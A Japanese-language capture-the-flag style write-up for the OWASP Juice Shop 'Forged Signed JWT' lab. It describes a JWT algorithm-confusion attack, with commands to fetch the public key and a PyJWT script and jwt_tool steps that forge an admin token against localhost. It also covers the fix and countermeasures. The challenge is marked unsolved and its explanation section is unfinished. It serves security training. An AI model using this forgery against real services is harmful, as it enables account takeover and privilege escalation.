# Forged Signed JWT ❌

**難易度:** ⭐⭐⭐⭐⭐⭐
**カテゴリ:** JWT
**目標:** RSA署名されたJWTを偽造する（アルゴリズム混乱攻撃）

---

## 思考プロセス

**ステップ1: Unsigned JWT との違いを理解**
```
「Unsigned JWT では alg: "none" で署名を無効化した」
    ↓
「しかし、多くのサーバーは "none" を拒否するようになった」
    ↓
「別のアプローチが必要...アルゴリズム混乱攻撃」
```

**ステップ2: RS256 と HS256 の違い**
```
「RS256 = RSA + SHA256（非対称鍵暗号）」
    - 秘密鍵で署名
    - 公開鍵で検証
    
「HS256 = HMAC + SHA256（対称鍵暗号）」
    - 共有シークレットで署名
    - 同じシークレットで検証
```

**ステップ3: アルゴリズム混乱攻撃**
```
「サーバーは RS256 で設定されているとする」
    ↓
「攻撃者: alg を HS256 に変更」
    ↓
「サーバーが alg フィールドを信頼して HS256 で検証しようとする」
    ↓
「HS256 の "シークレット" として何を使う？」
    ↓
「公開鍵を使う！（公開されているから入手可能）」
    ↓
「攻撃者は公開鍵で署名 → サーバーも公開鍵で検証 → 一致！」
```

## 前提条件

- サーバーの公開鍵を入手できること
- サーバーが JWT の alg フィールドを信頼していること

## 公開鍵の入手

```bash
# よくある公開鍵の場所
curl http://localhost:3000/.well-known/jwks.json
curl http://localhost:3000/encryptionkeys/jwt.pub
curl http://localhost:3000/api/config

# レスポンス例
-----BEGIN RSA PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END RSA PUBLIC KEY-----
```

## 実行手順

1. **現在のJWTを取得**
   ```javascript
   const currentToken = localStorage.getItem('token');
   console.log(currentToken);
   // eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6...
   ```

2. **公開鍵を取得**
   ```javascript
   fetch('/encryptionkeys/jwt.pub').then(r => r.text()).then(console.log);
   ```

3. **Python で攻撃トークンを生成**
   ```python
   import jwt
   import requests
   
   # 公開鍵を取得
   pub_key = requests.get('http://localhost:3000/encryptionkeys/jwt.pub').text
   
   # ペイロード（改ざん）
   payload = {
       "status": "success",
       "data": {
           "id": 1,
           "email": "admin@juice-sh.op",
           "role": "admin"
       }
   }
   
   # HS256 で署名（公開鍵を "シークレット" として使用）
   # PyJWT では algorithms を明示的に指定
   forged_token = jwt.encode(payload, pub_key, algorithm='HS256')
   print(forged_token)
   ```

4. **jwt_tool を使う方法**
   ```bash
   # jwt_tool インストール
   git clone https://github.com/ticarpi/jwt_tool
   cd jwt_tool
   pip install -r requirements.txt
   
   # 攻撃実行
   python jwt_tool.py <token> -S hs256 -k public_key.pem
   ```

5. **偽造トークンを使用**
   ```javascript
   fetch('/api/Users/1', {
     headers: {'Authorization': 'Bearer ' + forgedToken}
   }).then(r => r.json()).then(console.log);
   ```

## なぜこの攻撃が成功するか

```
脆弱なコード例:
  token = jwt.decode(token, public_key)  // アルゴリズムを指定していない
  
安全なコード:
  token = jwt.decode(token, public_key, algorithms=['RS256'])  // 明示的に指定
```

## 検証ポイント

- [ ] 公開鍵を取得できるか
- [ ] PyJWT / jwt_tool でトークン生成
- [ ] RS256 → HS256 変更が受け入れられるか
- [ ] 改ざんしたペイロードでアクセス可能か

## 対策

- JWT ライブラリで **アルゴリズムをホワイトリスト指定**
- `alg` フィールドを信頼しない
- 公開鍵を秘密にする（根本的解決ではない）

## 関連チャレンジ

- [Unsigned JWT](unsigned-jwt.md) - alg: "none" 攻撃
- [Login Admin](../difficulty-2/login-admin.md)

## 解説

[未着手]
